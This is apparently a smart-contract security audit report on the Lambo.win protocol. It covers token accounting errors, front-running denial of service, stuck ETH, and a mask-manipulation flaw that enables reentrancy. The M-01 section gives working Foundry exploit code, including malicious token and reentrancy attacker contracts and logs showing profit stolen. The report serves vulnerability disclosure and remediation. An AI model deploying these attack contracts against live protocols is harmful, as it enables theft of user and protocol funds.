# Lambo.win

## [H-01] Incorrect amount of vETH burned when cashing out ERC20 tokens

<https://github.com/code-423n4/2024-12-lambowin/blob/b8b8b0b1d7c9733a7bd9536e027886adb78ff83a/src/VirtualToken.sol#L82-L86>

### Description

The `VirtualToken` contract is designed to work with both native ETH and ERC20 tokens like USDC or USDT as the underlying asset.

However, there is an issue with how `cashOut()` handles the burning of vETH when the underlying asset is an ERC20 token. The function burns an `amount` of vETH from the caller and then transfers that same `amount` of the ERC20 token (USDC or USDT) to the caller:

```solidity
function cashOut(uint256 amount) external onlyWhiteListed {
    _burn(msg.sender, amount);
    _transferAssetToUser(amount);
    emit CashOut(msg.sender, amount);
}
```

The issue is that the `amount` of vETH burned will not correspond to the same quantity of the ERC20 token. For example, if the underlying token is USDC with 6 decimals, and a this function is called to cash out 100 USDC, the `amount` would be specified as 100000000. But this would incorrectly burn 100000000 wei of vETH which is not equal in value as 100 USDC.

### Impact

When the underlying token is an ERC20, calling `cashOut()` will a lower amount of the user's vETH than intended, while transferring to them an amount of the ERC20. The protocol will lose value with this action.

### Recommended Mitigation Steps

When cashing out ERC20 tokens, `cashOut()` should use an oracle (like Chainlink) to get the current price of the ERC20 token in terms of ETH. It can then calculate the amount of vETH to burn based on this price and the `amount` of ERC20 tokens being cashed out.

Here is the fix in the form of a diff:

```diff
function cashOut(uint256 amount) external onlyWhiteListed {
    uint256 vEthToBurn;
+    if (underlyingToken == LaunchPadUtils.NATIVE_TOKEN) {
+        vEthToBurn = amount;
+    } else {
+       uint256 erc20Price = getPrice(underlyingToken); // Get price of ERC20 in terms of ETH from an oracle
+       vEthToBurn = amount * erc20Price / 1e18; // Calculate amount of vETH to burn        
+    }
    _burn(msg.sender, vEthToBurn);
    _transferAssetToUser(amount);
    emit CashOut(msg.sender, amount);
}
```

## [H-02] Launchpad creation can be DOS by front-running with creation of Uniswap V2 pool

<https://github.com/code-423n4/2024-12-lambowin/blob/b8b8b0b1d7c9733a7bd9536e027886adb78ff83a/src/LamboVEthRouter.sol#L41-L57>

<https://github.com/code-423n4/2024-12-lambowin/blob/b8b8b0b1d7c9733a7bd9536e027886adb78ff83a/src/LamboFactory.sol#L65-L83>

### Description

The `LamboFactory` contract allows anyone to create a new launchpad by calling the `createLaunchPad()` function or `LamboVEthRouter.createLaunchPadAndInitialBuy()`. This deploys a new `LamboToken` representing the quote token of the launchpad, and creates a Uniswap V2 pool pairing this quote token with a provided virtual liquidity token (e.g. `vETH`).

However, the pool creation step can be front-run by an attacker to prevent the launchpad from being created. Specifically, after the new quote token is deployed, the factory calls `IPoolFactory(LaunchPadUtils.UNISWAP_POOL_FACTORY_).createPair(virtualLiquidityToken, quoteToken)` to create the pool. If the attacker monitors the mempool for `createLaunchPad()` transactions and quickly submits a transaction to create a pool on uniswap v2 with the same token pair, the factory's subsequent attempt to create the pool will revert since the pair already exists. This causes the entire `createLaunchPad()` call to revert.

### Impact

An attacker can prevent any launchpad from being created by always front-running the pool creation. This is a denial of service on a core functionality of the protocol. The attack is very cheap for the attacker to execute, as they only need to pay gas for a single Uniswap pool creation per launchpad they want to block.

### Proof of Concept

Here is a test that demonstrates the attack:

Add this test to `GeneralTest.t.sol` and run :

```bash
forge test --match-test test_dos_create_launchpad_with_same_liquidity_address -vvv
```

```solidity
function test_dos_create_launchpad_with_same_liquidity_address() public {
    // Hacker front-runs the transaction
    vm.startPrank(hacker);

    // Simulate the next lambo token creation to get the next lambo token address
    (, bytes memory err) = address(this).call(abi.encodeWithSignature("revertbutGetAddress()"));
    address qT = abi.decode(err, (address));

    // Create the pair on uniswap
    IPoolFactory(LaunchPadUtils.UNISWAP_POOL_FACTORY_).createPair(address(vETH), address(qT));
    vm.stopPrank();

    // Legitimate user tries to create a launchpad
    address legitimateUser = makeAddr("legitimate");
    vm.deal(legitimateUser, 100 ether);

    // Legitimate user's transaction should fail due to MAX_LOAN_PER_BLOCK
    vm.startPrank(legitimateUser);
    vm.expectRevert("UniswapV2: PAIR_EXISTS");
    lamboRouter.createLaunchPadAndInitialBuy{value: 1 ether}(
        address(factory),
        "legit",
        "legit",
        1 ether,
        1 ether 
    );
    vm.stopPrank();
}
```

### Recommended Mitigation Steps

The `LamboFactory` already has ownership of the `LamboToken` that is deployed for each launchpad. Therefore, if the pool already exists, it can use it safely.

To prevent this DOS, the factory should first check if a pool already exists for the token pair, and use that pool if so. Only if the pool doesn't exist yet should it attempt to create it.

For example:

```solidity
address pool = IPoolFactory(LaunchPadUtils.UNISWAP_POOL_FACTORY_).getPair(virtualLiquidityToken, quoteToken);
if (pool == address(0)) {
    pool = IPoolFactory(LaunchPadUtils.UNISWAP_POOL_FACTORY_).createPair(virtualLiquidityToken, quoteToken);
}
```

With this fix, if an attacker tries to front-run the pool creation, the factory will harmlessly use the attacker's pool and the launchpad will still be created successfully. The attacker's only impact would be paying to create the pool on the factory's behalf.

## [M-01] Arbitrary mask parameter in rebalance function allows stealing profit funds

### Description

The `LamboRebalanceOnUniwap` contract contains a `rebalance()` function that is intended to rebalance the liquidity in a Uniswap V3 pool between WETH and a virtual ETH token (vETH). It does this by taking a flash loan of WETH, swapping it for vETH or vice versa on the Uniswap pool depending on the pool balances, and then repaying the flash loan, keeping any profit.

However, the `rebalance()` function has a vulnerability due to the `directionMask` parameter being fully under the caller's control. This mask is used to manipulate the `uniswapPool` address passed to the Uniswap router (`OKXRouter`) when performing the swap:

From `onMorphoFlashLoan()`:

```solidity
uint256 _v3pool = uint256(uint160(uniswapPool)) | (directionMask);
uint256[] memory pools = new uint256[](1);
pools[0] = _v3pool;

if (directionMask == _BUY_MASK) {
    _executeBuy(amountIn, pools);
} else {
    _executeSell(amountIn, pools);
}
```

An attacker can craft a malicious `directionMask` that, when bitwise OR'ed with `uniswapPool`, results in the address of a malicious Uniswap pool contract deployed by the attacker. The `KXRouter` will then interact with this attacker-controlled pool instead of the intended `uniswapPool`.

The manipulation is done through a bitwise OR operation:

```solidity
uint256 _v3pool = uint256(uint160(uniswapPool)) | (directionMask);
```

The attacker needs to deploy their malicious pool contract to an address where the bits that are 1 in the `uniswapPool` address are 1 in the contract address, and some `uniswapPool` 0 bits are 1 in the contract address. This ensures that the bitwise OR operation results in the exact address of the attacker's malicious contract.

On uniswap v3, the pool address is computed from a salt based on the token0 and token1 addresses and the fee.

The pool will be made on `vETH` and an arbitrary token, called here `evilToken`.

By leveraging this, the attacker can mine the pool address by mining the `evilToken` address with create2.
For the sake of the test, and time constraint, I did not had time to write this script and mine the malicious pool address. (I used foundry cheatcodes in the PoC to bypass this step).

When the pool is mined with the right requirements, and as we know the `uniswapPool` address, the malicious mask is easy to calculate.

Now, the `directionMask` parameter in `rebalance()` is fully controlled by the caller. When the swap occurs on this malicious pool by the OKX router, a reentrancy attack is triggered (see Proof of Concept for more details), allowing the attacker to steal the profit intended for the `LamboRebalanceOnUniwap` contract.

### Impact

An attacker can steal all the profit that is aimed to the `LamboRebalanceOnUniwap` contract when rebalancing the pool. The attack will requires minimal capital outlay (only transaction costs), yet demonstrates significant profit potential (2.94 WETH confirmed in Proof of Concept (~11k usd at the time of the test)).

The severity is high for two key reasons:

1. It completely undermines the protocol's primary revenue mechanism by intercepting rebalancing profits
2. It threatens the protocol's economic sustainability, as rebalancing operations are essential for maintaining protocol solvency and operational efficiency

This vulnerability effectively nullifies the protocol's core profit generation mechanism.

### Proof of Concept

[You can find a graph of the attack here](https://github.com/m4k2/imgPublicreport/blob/main/Graph.svg)

Here the test that demonstrates the attack:

Create a `ProfitStealTest.t.sol` and add this test :

```bash
forge test --mt "test_steal_profit_with_malicious_pool_2" -vvvv
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {LamboRebalanceOnUniwap} from "../src/rebalance/LamboRebalanceOnUniwap.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {VirtualToken} from "../src/VirtualToken.sol";
import {IDexRouter} from "../src/interfaces/OKX/IDexRouter.sol";
import {LaunchPadUtils} from "../src/Utils/LaunchPadUtils.sol";
import {IWETH} from "../src/interfaces/IWETH.sol";

import {ILiquidityManager} from "../src/interfaces/Uniswap/ILiquidityManager.sol";
import {INonfungiblePositionManager} from "../src/interfaces/Uniswap/INonfungiblePositionManager.sol";
import {IPoolInitializer} from "../src/interfaces/Uniswap/IPoolInitializer.sol";
import {IUniswapV3Pool} from "../src/interfaces/Uniswap/IUniswapV3Pool.sol";
import {console} from "forge-std/console.sol";

interface IUniswapV3Factory {
    function getPool(
        address tokenA,
        address tokenB,
        uint24 fee
    ) external view returns (address pool);
}


contract RebalanceTest is Test {
    LamboRebalanceOnUniwap public lamboRebalance;
    uint256 private constant _ONE_FOR_ZERO_MASK = 1 << 255; // Mask for identifying if the swap is one-for-zero

    address public multiSign = 0x9E1823aCf0D1F2706F35Ea9bc1566719B4DE54B8;
    address public WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public OKXTokenApprove = 0x40aA958dd87FC8305b97f2BA922CDdCa374bcD7f;
    address public OKXRouter = 0x7D0CcAa3Fac1e5A943c5168b6CEd828691b46B36;

    address public VETH;
    address public uniswapPool;
    address public NonfungiblePositionManager = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
    address public uniswapV3Factory = 0x1F98431c8aD98523631AE4a59f267346ea31F984;
    
    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/eth");
        lamboRebalance = new LamboRebalanceOnUniwap();

        uint24 fee = 3000;

        vm.startPrank(multiSign);
        VETH = address(new VirtualToken("vETH", "vETH", LaunchPadUtils.NATIVE_TOKEN));
        VirtualToken(VETH).addToWhiteList(address(lamboRebalance));
        VirtualToken(VETH).addToWhiteList(address(this));
        vm.stopPrank();

        // prepare uniswapV3 pool(VETH <-> WETH)
        _createUniswapPool();

        lamboRebalance.initialize(address(this), address(VETH), address(uniswapPool), fee);
    }

    function _createUniswapPool() internal {
        VirtualToken(VETH).cashIn{value: 1000 ether}(1000 ether);
        VirtualToken(VETH).approve(NonfungiblePositionManager, 1000 ether);

        IWETH(WETH).deposit{value: 1000 ether}();
        IWETH(WETH).approve(NonfungiblePositionManager, 1000 ether);

        // uniswap only have several fee tial (1%, 0.3%, 0.05%, 0.03%), we select 0.3%
        uniswapPool = IPoolInitializer(NonfungiblePositionManager).createAndInitializePoolIfNecessary(
            VETH,
            WETH,
            uint24(3000),
            uint160(79228162514264337593543950336)
        );

        INonfungiblePositionManager.MintParams memory params = INonfungiblePositionManager.MintParams({
            token0: VETH,
            token1: WETH,
            fee: 3000,
            tickLower: -60,
            tickUpper: 60,
            amount0Desired: 400 ether,
            amount1Desired: 400 ether,
            amount0Min: 400 ether,
            amount1Min: 400 ether,
            recipient: multiSign,
            deadline: block.timestamp + 1 hours
        });

        INonfungiblePositionManager(NonfungiblePositionManager).mint(params);

        params = INonfungiblePositionManager.MintParams({
            token0: VETH,
            token1: WETH,
            fee: 3000,
            tickLower: -12000,
            tickUpper: -60,
            amount0Desired: 0,
            amount1Desired: 50 ether,
            amount0Min: 0,
            amount1Min: 0,
            recipient: multiSign,
            deadline: block.timestamp + 1 hours
        });
        INonfungiblePositionManager(NonfungiblePositionManager).mint(params);

        params = INonfungiblePositionManager.MintParams({
            token0: VETH,
            token1: WETH,
            fee: 3000,
            tickLower: 60,
            tickUpper: 12000,
            amount0Desired: 50 ether,
            amount1Desired: 0,
            amount0Min: 0,
            amount1Min: 0,
            recipient: multiSign,
            deadline: block.timestamp + 1 hours
        });
        INonfungiblePositionManager(NonfungiblePositionManager).mint(params);
    }

    function test_steal_profit_with_malicious_pool_2() public {
        // Initialize the test
        address hacker = makeAddr("hacker");
        address vETHWETHpool = lamboRebalance.uniswapPool();
        
        // Set the block timestamp to ensure consistent attack behavior
        vm.warp(1733645207);
    
        // Label addresses for better stack trace readability
        vm.label(hacker, "Hacker");
        vm.label(address(lamboRebalance), "LamboRebalance");
        vm.label(address(VETH), "VETH");
        vm.label(address(WETH), "WETH");
        vm.label(address(OKXRouter), "OKXRouter");
        vm.label(address(OKXTokenApprove), "OKXTokenApprove");
        vm.label(address(NonfungiblePositionManager), "NonfungiblePositionManager");
        vm.label(address(uniswapV3Factory), "UniswapV3Factory");
        vm.label(vETHWETHpool, "vETH:WETH_pool");
    
        // Start the attack by impersonating the hacker
        vm.startPrank(hacker);
    
        // Calculate the mask for the malicious pool
        // There are multiple possible masks and malicious addresses that can make the attack work
        // Here, we choose an arbitrary mask between all the possible ones to make the attack work
        uint256 maliciousPoolMask = uint256(uint160(~uint160(vETHWETHpool)) & 1111);
        uint256 maliciousEvil_vETH_pool_u256 = uint256(uint160(vETHWETHpool)) | (maliciousPoolMask);
        address maliciousEvil_vETH_pool = address(uint160(maliciousEvil_vETH_pool_u256));
        vm.label(address(uint160(maliciousEvil_vETH_pool)), "Malicious_pool");
    
        // Create an evil ERC20 token to be used for creating a malicious pool
        // Mint type(uint96).max to the hacker
        EvilERC20 evilERC20 = new EvilERC20();
        ReentrancyAttack attack = new ReentrancyAttack(address(VETH), address(WETH), address(OKXRouter), address(OKXTokenApprove), address(lamboRebalance), vETHWETHpool);
        evilERC20.setReentrancyAddress(address(attack));
    
        // Deploy the Uniswap V3 pool mock and set it to the malicious pool address
        // NOTE: This prevent me to mine a real univ3 pool address and facilitate the test as the time constraint is short
        UniswapV3PoolMock uniswapV3PoolMock = new UniswapV3PoolMock(address(evilERC20), address(VETH));
        vm.etch(maliciousEvil_vETH_pool, address(uniswapV3PoolMock).code);
        vm.copyStorage(address(uniswapV3PoolMock), maliciousEvil_vETH_pool);
        require(maliciousEvil_vETH_pool.code.length > 0, "Malicious pool code length is 0");
    
        // Set the token balances of the malicious pool to simulate real-world conditions of minting a position on it
        // 1 wei of VETH and 4000 ether of evilERC20 are sufficient for the attack (this is worth nothing in terms of value)
        deal(VETH, address(maliciousEvil_vETH_pool), 1 wei);
        EvilERC20(address(evilERC20)).transfer(address(maliciousEvil_vETH_pool), 4000 ether);

        // Populate both mappings in the factory so the OKXRouter can find the malicious pool
        // This simulates the scenario where the malicious address is mined and deployed officially by the UniswapV3Factory
        bytes32 getPoolSlot = keccak256(abi.encode(100, keccak256(abi.encode(address(VETH), keccak256(abi.encode(address(evilERC20), 5))))));
        vm.store(address(uniswapV3Factory), getPoolSlot, bytes32(uint256(uint160(maliciousEvil_vETH_pool))));
        getPoolSlot = keccak256(abi.encode(100, keccak256(abi.encode(address(evilERC20), keccak256(abi.encode(address(VETH), 5))))));
        vm.store(address(uniswapV3Factory), getPoolSlot, bytes32(uint256(uint160(maliciousEvil_vETH_pool))));
        require(IUniswapV3Factory(uniswapV3Factory).getPool(address(evilERC20), address(VETH), 100) == maliciousEvil_vETH_pool, "Malicious pool not found in factory");
    
        // Stop impersonating the hacker to put the pool in an imbalanced state
        vm.stopPrank();
    
        // Set the vETH:WETH pool in an imbalanced state where rebalancing would be profitable
        // This will imbalance the pool with a lack of vETH and a surplus of WETH
        uint256 amount = 422 ether;
        vm.deal(address(this), amount);
        uint256 _v3pool = uint256(uint160(uniswapPool)) | (_ONE_FOR_ZERO_MASK);
        uint256[] memory pools = new uint256[](1);
        pools[0] = _v3pool;
        uint256 amountOut0 = IDexRouter(OKXRouter).uniswapV3SwapTo{value: amount}(
            uint256(uint160(multiSign)),
            amount,
            0,
            pools
        );
    
        // Preview the rebalance to ensure it is profitable
        (bool result, uint256 directionMask, uint256 amountIn, uint256 amountOut) = lamboRebalance.previewRebalance();
        require(result, "Rebalance not profitable");
    
        // Log the hacker's WETH balance before the attack
        console.log("hacker WETH balance before attack  : %e", IERC20(WETH).balanceOf(hacker));
    
        // Start the attack by impersonating the hacker again
        vm.startPrank(hacker);
    
        // In the real world, the OKX router will send the vETH to the malicious pool, and on the evilERC20 transfer,
        // A new swap will be performed on the malicious pool to get back the vETH and perform the reentrancy attack
        // But cause of time constraint, I will just funds the attack contract with 500 ether of vETH and avoid this swap back =(
        deal(VETH, address(attack), amountIn);
    
        // Use the malicious pool mask instead of the legitimate one
        // The OKX router will point to the malicious pool thanks to the mask manipulation
        // When the evilERC20 will be transferred, the reentrancy attack will be started
        lamboRebalance.rebalance(maliciousPoolMask /* directionMask */, amountIn, amountOut);
    
        // Withdraw the WETH profit from the attack contract
        ReentrancyAttack(address(attack)).withdraw();
    
        // Stop impersonating the hacker
        vm.stopPrank();
    
        // Log the hacker's WETH balance after the attack
        console.log("");
        console.log("hacker WETH balance after attack   : %e", IERC20(WETH).balanceOf(hacker));
    }
}

contract ReentrancyAttack{

    address public VETH;
    address public OKXRouter;
    address public OKXTokenApprove;
    address public lamboRebalance;
    address public WETH;
    address public owner;
    address public uniswapPool;

    bool public secondTime = false;
    
    constructor(address _veth, address _WETH, address _OKXRouter, address _OKXTokenApprove, address _lamboRebalance, address _uniswapPool) {
        VETH = _veth;
        OKXRouter = _OKXRouter;
        OKXTokenApprove = _OKXTokenApprove;
        lamboRebalance = _lamboRebalance;
        WETH = _WETH;
        uniswapPool = _uniswapPool;  

        owner = msg.sender;
    }
    
    function reentrancyAttack() public {
        // Check if this is the second time the function is called
        // This is to avoid starting the attack when the attacker funds the malicious pool
        // and when the redeem is called on the malicious pool
        if (!secondTime) {    
            secondTime = true;
            return;
        }
    
        // Preview the rebalance to get the amountIn required for the swap
        (bool result, , uint256 amountIn, ) = LamboRebalanceOnUniwap(payable(lamboRebalance)).previewRebalance();
        require(result, "Rebalance not profitable");
    
        // Prepare the parameters for the swap
        uint256 _v3pool = uint256(uint160(uniswapPool));
        uint256[] memory pools = new uint256[](1);
        pools[0] = _v3pool;
    
        // Approve the OKXTokenApprove contract to spend the required amountIn of VETH
        IERC20(VETH).approve(address(OKXTokenApprove), amountIn);
    
        // Perform the swap on the legit Uniswap V3 pool using the OKXRouter
        IDexRouter(OKXRouter).uniswapV3SwapTo(uint256(uint160(address(this))), amountIn, 0, pools);
    
        // Calculate the profit by subtracting the amountIn and 1 wei from the WETH balance
        uint256 profit = IERC20(WETH).balanceOf(address(this)) - (amountIn + 1 wei);
        require(profit > 0, "No profit in reentrancyAttack");
    
        // Send 1 wei of WETH to the lamboRebalance contract so it is in benefit and doesn't revert
        // Keep the remaining profit in this contract
        IERC20(WETH).transfer(address(lamboRebalance), amountIn + 1 wei);
    }
    
    function withdraw() public {
        require(msg.sender == owner, "Not owner");
    
        // Transfer the entire WETH balance to the caller (owner)
        IERC20(WETH).transfer(msg.sender, IERC20(WETH).balanceOf(address(this)));
    
        // Transfer the entire VETH balance to the caller (owner)
        IERC20(VETH).transfer(msg.sender, IERC20(VETH).balanceOf(address(this)));
    }
}

contract EvilERC20 {
    mapping(address => uint256) public _balances;
    uint256 private _totalSupply;
    address owner;
    address reentrancyAddress;
    constructor() {
        owner = msg.sender;
        _mint(owner, type(uint96).max);
    }

    function setReentrancyAddress(address _reentrancyAddress) public {
        require(msg.sender == owner, "Not owner");
        reentrancyAddress = _reentrancyAddress;
    }

    function mint(address who, uint256 amount) external {
        require(msg.sender == owner, "Not owner");
        _mint(who, amount);
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public returns (bool) {
        _transfer(sender, recipient, amount);
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        // Hijack control flow
        address(reentrancyAddress).call(abi.encodeWithSignature("reentrancyAttack()"));

        //update the balances
        _balances[recipient] = _balances[recipient] + amount;
        _balances[sender] = _balances[sender] - amount;
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply + amount;
        _balances[account] = _balances[account] + amount;
    }
}

// write a UNIv3 pool mock with very simple function of swap and mint
contract UniswapV3PoolMock {

    address public token0;
    address public token1;

    constructor(address _token0, address _token1) {
        token0 = _token0;
        token1 = _token1;
    }

    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1) {
        // Perform necessary checks and validations

        // Calculate the amounts of token0 and token1 to swap
        if (!zeroForOne) {
            amount0 = -amountSpecified;
            amount1 = amountSpecified;
        } else {
            amount0 = amountSpecified;
            amount1 = -amountSpecified;
        }
        // Transfer tokens between the pool and the recipient
        if (amount0 > 0) {
            IERC20(token0).transfer(recipient, uint256(amount0));
        } else if (amount1 > 0) {
            IERC20(token1).transfer(recipient, uint256(amount1));
        }



        return (amount0, amount1);
    }
}
```

With the attack result, the attacker will get 2.94 WETH:

```
Logs:
  hacker WETH balance before attack  : 0e0
  hacker WETH balance after attack   : 2.946145314758099342e18
```

### Recommended Mitigation Steps

Check the `directionMask` parameter in `onMorphoFlashLoan()` to ensure it is always the correct one, even for the _SELL_MASK.

Here's the modified code of `onMorphoFlashLoan()`:

```diff
function onMorphoFlashLoan(uint256 assets, bytes calldata data) external {
    require(msg.sender == address(morphoVault), "Caller is not morphoVault");
    (uint256 directionMask, uint256 amountIn, uint256 amountOut) = abi.decode(data, (uint256, uint256, uint256));
    require(amountIn == assets, "Amount in does not match assets");

    uint256 _v3pool = uint256(uint160(uniswapPool)) | (directionMask);
    uint256[] memory pools = new uint256[](1);
    pools[0] = _v3pool;

    if (directionMask == _BUY_MASK) {
        _executeBuy(amountIn, pools);
-   } else {
+   } else if (directionMask == _SELL_MASK) {
        _executeSell(amountIn, pools);
+   } else {
+       revert("Invalid directionMask");
+   }

    require(IERC20(weth).approve(address(morphoVault), assets), "Approve failed");
}
```

This will ensure that `rebalance()` always interacts with the intended Uniswap pool and cannot be manipulated into using a malicious contract.

## [M-02] Launchpad creation can be DOS by front-running with max loan amount

<https://github.com/code-423n4/2024-12-lambowin/blob/b8b8b0b1d7c9733a7bd9536e027886adb78ff83a/src/LamboVEthRouter.sol#L41-L57>
<https://github.com/code-423n4/2024-12-lambowin/blob/b8b8b0b1d7c9733a7bd9536e027886adb78ff83a/src/LamboFactory.sol#L65-L83>

### Description

The `LamboFactory` contract allows anyone to create a new launchpad by calling the `createLaunchPad()` function. This function enforces a maximum loan amount per block, set by the `MAX_LOAN_PER_BLOCK` constant (300 ethers). If the total loan amount in the current block has already reached this maximum, further calls to `createLaunchPad()` will revert.

An attacker can exploit this by front-running legitimate launchpad creations and creating their own launchpad first in the block, borrowing the maximum allowed `MAX_LOAN_PER_BLOCK` amount. This will cause any subsequent launchpad creations in the same block to fail, effectively blocking or denying service to other users.

The root cause is that `createLaunchPad()` does not have any access controls and the `MAX_LOAN_PER_BLOCK` limit is enforced on a per-block basis across all launchpads. Note, that even with a proper access control (only calable by the `LamboVEthRouter`), the attack will still work with the same cost for the attacker.

### Impact

Legitimate users will be DOS from creating new launchpads if an attacker front-runs them in the same block and exhausts the `MAX_LOAN_PER_BLOCK` limit. Note that all the tx in the block will be DOS for only one tx by the attacker. This denial of service attack can be performed at no cost to the attacker (only the tx cost).

### Proof of Concept

Here is a test that demonstrates the attack:

Add this test to `GeneralTest.t.sol` and run :

```bash
forge test --match-test test_dos_create_launchpad -vvv
```

```solidity
function test_dos_create_launchpad() public {
    // Setup initial values for launchpad
    uint256 MAX_LOAN_PER_BLOCK = 300 ether;
    
    // Set the hacker balance to 0, to prove the attack is free of cost, only the txt cost
    vm.deal(hacker, 0 ether);

    // the loan amount is 0
    console2.log("loan amount this block", vETH.loanedAmountThisBlock());

    // Hacker front-runs the transaction, it only incurs the tx cost
    vm.startPrank(hacker);
    factory.createLaunchPad(
        "malicious",
        "malicious",
        MAX_LOAN_PER_BLOCK,
        address(vETH)
    );
    vm.stopPrank();


    console2.log("loan amount this block after front run", vETH.loanedAmountThisBlock());
    // Assert the max loan for this block is reached
    assertTrue(vETH.loanedAmountThisBlock() == MAX_LOAN_PER_BLOCK);
    
    // Legitimate user tries to create a launchpad
    address legitimateUser = makeAddr("legitimate");
    vm.deal(legitimateUser, 100 ether);

    // Legitimate user's transaction should fail due to MAX_LOAN_PER_BLOCK
    vm.startPrank(legitimateUser);
    vm.expectRevert("Loan limit per block exceeded"); // Expect the transaction to revert because max loan for this block is reached
    lamboRouter.createLaunchPadAndInitialBuy{value: 1 ether}(
        address(factory),
        "legit",
        "legit",
        1 ether,
        1 ether 
    );
    vm.stopPrank();
}
```

### Recommended Mitigation Steps

Even adding access control to `createLaunchPad()` will not be sufficient, as an attacker could still front-run via `LamboVEthRouter.createLaunchPadAndInitialBuy()`.

Think about depositing some collateral in the `LamboVEthRouter` to make this attack less cost free, but it will not patch the vulnerability completely.

## [M-03] Lack of withdrawal function for stuck ETH

<https://github.com/code-423n4/2024-12-lambowin/blob/b8b8b0b1d7c9733a7bd9536e027886adb78ff83a/src/LamboVEthRouter.sol#L180-L188>

### Description

The `LamboVEthRouter` contract does not have a way for the owner to withdraw ETH that gets stuck in the contract. This can happen in two ways:

1. In the `_buyQuote()` function, 1 wei is intentionally left in the contract on each call with the `msg.value` > `amountXIn + fee + 1` to account for rounding.
2. If ETH is accidentally sent to the contract address directly, it will be accepted by the `receive()` function and get stuck.

```solidity
if (msg.value > (amountXIn + fee + 1)) {
    (bool success, ) = payable(msg.sender).call{value: msg.value - amountXIn - fee - 1}("");
    require(success, "ETH transfer failed");
}
```

Over many calls, this 1 wei per call can accumulate to a significant amount of stuck ETH.

Without a function to withdraw this ETH, it will remain stuck in the contract forever.

### Impact

The `LamboVEthRouter` contract is designed to handle meme coins, which are known for generating an extremely high volume of buy and sell transactions. With the current implementation leaving 1 wei in the contract on a big part of `_buyQuote()` call's, this seemingly small amount can quickly accumulate to a significant sum due to the massive number of transactions associated with these meme coins. As a result, a substantial amount of ETH may become permanently stuck and unrecoverable by the contract owner over time. Additionally, any ETH accidentally sent directly to the contract will also be trapped, further compounding the issue of inaccessible funds within the contract.

### Recommended Mitigation Steps

Add an `onlyOwner` function that allows the contract owner to withdraw any ETH balance held by the contract, such as:

```solidity
function withdrawStuckETH() external onlyOwner {
    (bool success,) = payable(owner()).call{value: address(this).balance}("");
    require(success, "ETH transfer failed");
}
```

